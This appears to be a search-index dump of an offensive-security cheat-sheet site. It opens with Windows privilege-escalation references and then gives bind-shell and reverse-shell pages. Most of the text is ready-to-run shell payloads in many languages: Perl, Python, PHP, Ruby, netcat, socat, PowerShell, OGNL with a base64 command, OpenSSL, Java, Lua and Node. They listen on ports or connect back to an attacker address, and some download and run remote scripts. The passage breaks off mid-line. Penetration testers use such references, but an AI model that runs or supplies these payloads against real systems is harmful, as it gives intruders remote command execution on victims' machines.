https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege</p>"},{"location":"privilege-escalation/windows/#references","title":"References","text":"<ul> <li>icacls - Docs Microsoft</li> <li>Privilege Escalation Windows - Philip Linghammar</li> <li>Windows elevation of privileges - Guifre Ruiz</li> <li>The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte</li> <li>Basic Linux Privilege Escalation</li> <li>Windows Privilege Escalation Fundamentals</li> <li>TOP\u201310 ways to boost your privileges in Windows systems - hackmag</li> <li>The SYSTEM Challenge</li> <li>Windows Privilege Escalation Guide - absolomb's security blog</li> <li>Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs</li> <li>Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell</li> <li>Pentestlab.blog - WPE-01 - Stored Credentials</li> <li>Pentestlab.blog - WPE-02 - Windows Kernel</li> <li>Pentestlab.blog - WPE-03 - DLL Injection</li> <li>Pentestlab.blog - WPE-04 - Weak Service Permissions</li> <li>Pentestlab.blog - WPE-05 - DLL Hijacking</li> <li>Pentestlab.blog - WPE-06 - Hot Potato</li> <li>Pentestlab.blog - WPE-07 - Group Policy Preferences</li> <li>Pentestlab.blog - WPE-08 - Unquoted Service Path</li> <li>Pentestlab.blog - WPE-09 - Always Install Elevated </li> <li>Pentestlab.blog - WPE-10 - Token Manipulation</li> <li>Pentestlab.blog - WPE-11 - Secondary Logon Handle</li> <li>Pentestlab.blog - WPE-12 - Insecure Registry Permissions</li> <li>Pentestlab.blog - WPE-13 - Intel SYSRET</li> <li>Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @xpn</li> <li>Living Off The Land Binaries and Scripts (and now also Libraries)</li> <li>Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec</li> <li>Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</li> <li>Abusing Diaghub - xct - March 07, 2019</li> <li>Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018</li> <li>Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019</li> <li>Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows</li> <li>Abusing SeLoadDriverPrivilege for privilege escalation - 14 JUN 2018 - OSCAR MALLO</li> <li>Universal Privilege Escalation and Persistence \u2013 Printer - AUGUST 2, 2021)</li> <li>ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - March 17, 2022 | Simon Zuckerbraun</li> <li>Bypassing AppLocker by abusing HashInfo - 2022-08-19 - Ian</li> <li>Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code</li> <li>IN THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_ </li> <li>Potatoes - Windows Privilege Escalation - Jorge Lajara - November 22, 2020</li> <li>MSIFortune - LPE with MSI Installers - Oct 3, 2023 - PfiatDe</li> <li>MSI Shenanigans. Part 1 \u2013 Offensive Capabilities Overview - DECEMBER 8, 2022 - Mariusz Banach</li> <li>Escalating Privileges via Third-Party Windows Installers - ANDREW OLIVEAU - JUL 19, 2023</li> <li>Deleting Your Way Into SYSTEM: Why Arbitrary File Deletion Vulnerabilities Matter - ANDREW OLIVEAU - SEP 11, 2023</li> <li>ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - Simon Zuckerbraun - March 17, 2022 </li> </ul>"},{"location":"shells/bind-shell/","title":"Bind Shell","text":""},{"location":"shells/bind-shell/#summary","title":"Summary","text":"<ul> <li>Bind Shell<ul> <li>Perl</li> <li>Python</li> <li>PHP</li> <li>Ruby</li> <li>Netcat Traditional</li> <li>Netcat OpenBsd</li> <li>Socat</li> <li>Powershell</li> </ul> </li> </ul>"},{"location":"shells/bind-shell/#perl","title":"Perl","text":"<pre><code>perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\\\nbind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\\\nclose C){open(STDIN,\"&gt;&amp;C\");open(STDOUT,\"&gt;&amp;C\");open(STDERR,\"&gt;&amp;C\");exec(\"/bin/bash -i\");};'\n</code></pre>"},{"location":"shells/bind-shell/#python","title":"Python","text":"<p>Single line : <pre><code>python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",51337));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'\n</code></pre></p> <p>Expanded version :</p> <pre><code>import socket as s,subprocess as sp;\n\ns1 = s.socket(s.AF_INET, s.SOCK_STREAM);\ns1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);\ns1.bind((\"0.0.0.0\", 51337));\ns1.listen(1);\nc, a = s1.accept();\n\nwhile True: \n    d = c.recv(1024).decode();\n    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);\n    c.sendall(p.stdout.read()+p.stderr.read())\n</code></pre>"},{"location":"shells/bind-shell/#php","title":"PHP","text":"<pre><code>php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",51337);\\\nsocket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\\\n$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);\\\n    socket_write($cl,$m,strlen($m));}}'\n</code></pre>"},{"location":"shells/bind-shell/#ruby","title":"Ruby","text":"<pre><code>ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",s,s,s)'\n</code></pre>"},{"location":"shells/bind-shell/#netcat-traditional","title":"Netcat Traditional","text":"<pre><code>nc -nlvp 51337 -e /bin/bash\n</code></pre>"},{"location":"shells/bind-shell/#netcat-openbsd","title":"Netcat OpenBsd","text":"<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 51337 &gt;/tmp/f\n</code></pre>"},{"location":"shells/bind-shell/#socat","title":"Socat","text":"<pre><code>user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 \nuser@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane\n</code></pre>"},{"location":"shells/bind-shell/#powershell","title":"Powershell","text":"<pre><code>https://github.com/besimorhino/powercat\n# Victim (listen)\n. .\\powercat.ps1\npowercat -l -p 7002 -ep\n# Connect from attacker\n. .\\powercat.ps1\npowercat -c 127.0.0.1 -p 7002\n</code></pre>"},{"location":"shells/reverse-shell/","title":"Reverse Shell","text":""},{"location":"shells/reverse-shell/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Reverse Shell<ul> <li>Awk</li> <li>Automatic Reverse Shell Generator</li> <li>Bash TCP</li> <li>Bash UDP</li> <li>C</li> <li>Dart</li> <li>Golang</li> <li>Groovy Alternative 1</li> <li>Groovy</li> <li>Java Alternative 1</li> <li>Java Alternative 2</li> <li>Java</li> <li>Lua</li> <li>Ncat</li> <li>Netcat OpenBsd</li> <li>Netcat BusyBox</li> <li>Netcat Traditional</li> <li>NodeJS</li> <li>OGNL</li> <li>OpenSSL</li> <li>Perl</li> <li>PHP</li> <li>Powershell</li> <li>Python</li> <li>Ruby</li> <li>Rust</li> <li>Socat</li> <li>Telnet</li> <li>War</li> </ul> </li> <li>Meterpreter Shell<ul> <li>Windows Staged reverse TCP</li> <li>Windows Stageless reverse TCP</li> <li>Linux Staged reverse TCP</li> <li>Linux Stageless reverse TCP</li> <li>Other platforms</li> </ul> </li> <li>Spawn TTY Shell</li> <li>References</li> </ul>"},{"location":"shells/reverse-shell/#tools","title":"Tools","text":"<ul> <li>reverse-shell-generator - Hosted Reverse Shell generator (source) </li> <li>revshellgen -  CLI Reverse Shell generator</li> </ul>"},{"location":"shells/reverse-shell/#reverse-shell_1","title":"Reverse Shell","text":""},{"location":"shells/reverse-shell/#bash-tcp","title":"Bash TCP","text":"<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1\n\n0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196\n\n/bin/bash -l &gt; /dev/tcp/10.0.0.1/4242 0&lt;&amp;1 2&gt;&amp;1\n</code></pre>"},{"location":"shells/reverse-shell/#bash-udp","title":"Bash UDP","text":"<pre><code>Victim:\nsh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1\n\nListener:\nnc -u -lvp 4242\n</code></pre> <p>Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>"},{"location":"shells/reverse-shell/#socat","title":"Socat","text":"<p><pre><code>user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242\nuser@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242\n</code></pre> <pre><code>user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242\n</code></pre></p> <p>Static socat binary can be found at https://github.com/andrew-d/static-binaries</p>"},{"location":"shells/reverse-shell/#perl","title":"Perl","text":"<pre><code>perl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\n\nperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'\n\n\nNOTE: Windows only\nperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'\n</code></pre>"},{"location":"shells/reverse-shell/#python","title":"Python","text":"<p>Linux only</p> <p>IPv4 <pre><code>export RHOST=\"10.0.0.1\";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n</code></pre></p> <p>IPv4 (No Spaces) <pre><code>python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n</code></pre></p> <p>IPv4 (No Spaces, Shortened) <pre><code>python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'\n</code></pre></p> <p>IPv4 (No Spaces, Shortened Further) <pre><code>python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n</code></pre> <pre><code>python -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'\n</code></pre> <pre><code>python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'\n</code></pre></p> <p>IPv6 <pre><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre></p> <p>IPv6 (No Spaces) <pre><code>python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n</code></pre></p> <p>IPv6 (No Spaces, Shortened) <pre><code>python -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n</code></pre></p> <p>Windows only (Python2)</p> <pre><code>python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"\n</code></pre> <p>Windows only (Python3)</p> <pre><code>python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\\\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\",globals())).start()\"\n</code></pre>"},{"location":"shells/reverse-shell/#php","title":"PHP","text":"<pre><code>php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);shell_exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);system(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);passthru(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);popen(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\", \"r\");'\n</code></pre> <pre><code>php -r '$sock=fsockopen(\"10.0.0.1\",4242);$proc=proc_open(\"/bin/sh -i\", array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'\n</code></pre>"},{"location":"shells/reverse-shell/#ruby","title":"Ruby","text":"<pre><code>ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\n\nruby -rsocket -e'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4242\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'\n\nNOTE: Windows only\nruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.1\",\"4242\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n</code></pre>"},{"location":"shells/reverse-shell/#rust","title":"Rust","text":"<pre><code>use std::net::TcpStream;\nuse std::os::unix::io::{AsRawFd, FromRawFd};\nuse std::process::{Command, Stdio};\n\nfn main() {\n    let s = TcpStream::connect(\"10.0.0.1:4242\").unwrap();\n    let fd = s.as_raw_fd();\n    Command::new(\"/bin/sh\")\n        .arg(\"-i\")\n        .stdin(unsafe { Stdio::from_raw_fd(fd) })\n        .stdout(unsafe { Stdio::from_raw_fd(fd) })\n        .stderr(unsafe { Stdio::from_raw_fd(fd) })\n        .spawn()\n        .unwrap()\n        .wait()\n        .unwrap();\n}\n</code></pre>"},{"location":"shells/reverse-shell/#golang","title":"Golang","text":"<pre><code>echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go\n</code></pre>"},{"location":"shells/reverse-shell/#netcat-traditional","title":"Netcat Traditional","text":"<pre><code>nc -e /bin/sh 10.0.0.1 4242\nnc -e /bin/bash 10.0.0.1 4242\nnc -c bash 10.0.0.1 4242\n</code></pre>"},{"location":"shells/reverse-shell/#netcat-openbsd","title":"Netcat OpenBsd","text":"<pre><code>rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f\n</code></pre>"},{"location":"shells/reverse-shell/#netcat-busybox","title":"Netcat BusyBox","text":"<pre><code>rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f\n</code></pre>"},{"location":"shells/reverse-shell/#ncat","title":"Ncat","text":"<pre><code>ncat 10.0.0.1 4242 -e /bin/bash\nncat --udp 10.0.0.1 4242 -e /bin/bash\n</code></pre>"},{"location":"shells/reverse-shell/#ognl","title":"OGNL","text":"<pre><code>(#a='echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg== | base64 -d | bash -i').(#b={'bash','-c',#a}).(#p=new java.lang.ProcessBuilder(#b)).(#process=#p.start())\n</code></pre> <p>With <code>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg==</code> decoding to <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1'</code>, the payload within the single quotes might be changed by any Linux-compatible reverse shell.</p>"},{"location":"shells/reverse-shell/#openssl","title":"OpenSSL","text":"<p>Attacker: <pre><code>user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nuser@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242\nor\nuser@attack$ ncat --ssl -vv -l -p 4242\nuser@victim$ mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.0.0.1:4242 &gt; /tmp/s; rm /tmp/s\n</code></pre></p> <p>TLS-PSK (does not rely on PKI or self-signed certificates) <pre><code># generate 384-bit PSK\n# use the generated string as a value for the two PSK variables from below\nopenssl rand -hex 48 \n# server (attacker)\nexport LHOST=\"*\"; export LPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT\n# client (victim)\nexport RHOST=\"10.0.0.1\"; export RPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; export PIPE=\"/tmp/`openssl rand -hex 4`\"; mkfifo $PIPE; /bin/sh -i &lt; $PIPE 2&gt;&amp;1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT &gt; $PIPE; rm $PIPE\n</code></pre></p>"},{"location":"shells/reverse-shell/#powershell","title":"Powershell","text":"<pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n</code></pre> <pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')\n</code></pre>"},{"location":"shells/reverse-shell/#awk","title":"Awk","text":"<pre><code>awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4242\"; while(42) { do{ printf \"shell&gt;\" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n</code></pre>"},{"location":"shells/reverse-shell/#java","title":"Java","text":"<pre><code>Runtime r = Runtime.getRuntime();\nProcess p = r.exec(\"/bin/bash -c 'exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done'\");\np.waitFor();\n</code></pre>"},{"location":"shells/reverse-shell/#java-alternative-1","title":"Java Alternative 1","text":"<pre><code>String host=\"127.0.0.1\";\nint port=4444;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre>"},{"location":"shells/reverse-shell/#java-alternative-2","title":"Java Alternative 2","text":"<p>NOTE: This is more stealthy</p> <pre><code>Thread thread = new Thread(){\n    public void run(){\n        // Reverse shell here\n    }\n}\nthread.start();\n</code></pre>"},{"location":"shells/reverse-shell/#telnet","title":"Telnet","text":"<pre><code>In Attacker machine start two listeners:\nnc -lvp 8080\nnc -lvp 8081\n\nIn Victime machine run below command:\ntelnet &lt;Your_IP&gt; 8080 | /bin/sh | telnet &lt;Your_IP&gt; 8081\n</code></pre>"},{"location":"shells/reverse-shell/#war","title":"War","text":"<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war &gt; reverse.war\nstrings reverse.war | grep jsp # in order to get the name of the file\n</code></pre>"},{"location":"shells/reverse-shell/#lua","title":"Lua","text":"<p>Linux only</p> <pre><code>lua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\"\n</code></pre> <p>Windows and Linux</p> <pre><code>lua5.1 -e 'local host, port = \"10.0.0.1\", 4242 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\n</code></pre>"},{"location":"shells/reverse-shell/#nodejs","title":"NodeJS","text":"<pre><code>(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client = new net.Socket();\n    client.connect(4242, \"10.0.0.1\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application from crashing\n})();\n\n\nor\n\nrequire('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')\n\nor\n\n-var x = global.process.mainModule.require\n-x('child_process').exec('nc 10.0.0.1 4242 -e 